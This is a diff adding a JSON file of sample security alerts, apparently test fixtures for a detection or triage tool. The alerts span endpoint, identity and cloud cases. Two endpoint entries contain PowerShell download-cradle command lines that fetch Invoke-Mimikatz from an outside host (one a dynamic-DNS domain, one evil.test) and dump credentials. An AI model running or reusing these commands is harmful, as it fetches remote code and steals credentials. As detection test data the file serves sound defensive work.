@@ -1,0 +1,68 @@
+[
+  {
+    "name": "powershell.exe download cradle + Mimikatz",
+    "domain": "endpoint",
+    "host": "ECL-WKS-0421",
+    "host_type": "Workstation",
+    "severity": "Critical",
+    "image": "powershell.exe",
+    "command_line": "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://vhf.sytes.net/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds\""
+  },
+  {
+    "name": "Admin process listing (benign)",
+    "domain": "endpoint",
+    "host": "IT-ADMIN-01",
+    "host_type": "Workstation",
+    "severity": "High",
+    "image": "powershell.exe",
+    "command_line": "Get-Process | Sort-Object CPU -Descending | Select-Object -First 10"
+  },
+  {
+    "name": "Mimikatz on a domain controller",
+    "domain": "endpoint",
+    "host": "DC01",
+    "host_type": "Server",
+    "severity": "Critical",
+    "image": "powershell.exe",
+    "command_line": "IEX (New-Object Net.WebClient).DownloadString('http://evil.test/m.ps1'); Invoke-Mimikatz -DumpCreds"
+  },
+  {
+    "name": "Impossible travel + MFA push bombing",
+    "domain": "identity",
+    "user": "swilson@corp.com",
+    "severity": "High",
+    "signals": ["impossible_travel", "mfa_fatigue"]
+  },
+  {
+    "name": "MFA fatigue against break-glass admin",
+    "domain": "identity",
+    "user": "breakglass@corp.com",
+    "severity": "Critical",
+    "signals": ["mfa_fatigue", "new_device_admin"]
+  },
+  {
+    "name": "CloudTrail disabled + new access key",
+    "domain": "cloud",
+    "resource": "arn:aws:iam::acct:user/deploy",
+    "env": "staging",
+    "severity": "Critical",
+    "signals": ["cloudtrail_disabled", "new_access_key"]
+  },
+  {
+    "name": "Root API usage in production",
+    "domain": "cloud",
+    "resource": "root",
+    "env": "production",
+    "severity": "Critical",
+    "signals": ["root_api_usage"]
+  },
+  {
+    "name": "Low severity browser noise",
+    "domain": "endpoint",
+    "host": "ECL-WKS-0999",
+    "host_type": "Workstation",
+    "severity": "Low",
+    "image": "chrome.exe",
+    "command_line": "chrome.exe --type=renderer"
+  }
+]
